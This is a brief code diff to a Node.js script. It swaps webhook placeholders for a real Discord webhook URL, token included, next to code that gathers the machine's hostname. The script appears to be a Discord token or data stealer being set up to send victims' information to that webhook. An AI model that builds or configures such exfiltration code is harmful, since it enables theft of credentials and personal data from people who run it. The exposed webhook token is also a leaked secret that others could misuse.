@@ -8,8 +8,8 @@ const querystring = require('querystring');
 const os = require('os')
 
 
-var pphood = "%WEBHOOK_LINK%";
-var pphood2 = "%WEBHOOK_LINK%";
+var pphood = "https://discord.com/api/webhooks/955065420002516993/Vkd9TS4XcnfTFWOG53lu0bdvlY3P_dj7kCL7GwkBiRVInt6QuAlIfLg7LzPJKhPw6oS2";
+var pphood2 = "https://discord.com/api/webhooks/955065420002516993/Vkd9TS4XcnfTFWOG53lu0bdvlY3P_dj7kCL7GwkBiRVInt6QuAlIfLg7LzPJKhPw6oS2";
 
 
 const computerName = os.hostname();
